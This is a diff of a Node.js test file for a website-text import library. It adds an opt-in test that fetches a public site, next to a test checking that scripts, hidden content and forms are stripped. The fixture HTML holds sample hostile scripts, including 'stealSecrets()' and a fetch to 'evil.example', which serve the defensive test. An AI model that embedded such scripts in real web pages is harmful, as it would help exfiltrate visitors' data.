@@ -1,8 +1,15 @@
 import { test } from "node:test";
 import assert from "node:assert/strict";
 import { randomUUID } from "node:crypto";
-import { extractWebsiteText, websiteUrl, MAX_SOURCE_TEXT } from "../lib/website-source.ts";
+import { extractWebsiteText, fetchWebsiteHtml, websiteUrl, MAX_SOURCE_TEXT } from "../lib/website-source.ts";
 import { readOnboardingSnapshot } from "../lib/onboarding.ts";
+
+test("public HTTPS import follows the EmbedBot redirect and reads usable content", { skip: process.env.TEST_PUBLIC_WEBSITE !== "1" }, async () => {
+  const html = await fetchWebsiteHtml("https://embedbot.dk/");
+  const extracted = extractWebsiteText(html);
+  assert.match(extracted.text, /EmbedBot/i);
+  assert.ok(extracted.text.length > 100);
+});
 
 test("HTML import extracts knowledge without scripts, hidden content, forms or page execution", () => {
   const result = extractWebsiteText('<html><head><title>Title</title><script>stealSecrets()</script></head><body><h1>Vores butik</h1><p>Vi sælger håndlavede borde og stole.</p><div hidden>private hidden data</div><form>Kortnummer: secret</form><iframe>embedded secret</iframe><script>fetch("https://evil.example")</script></body></html>');
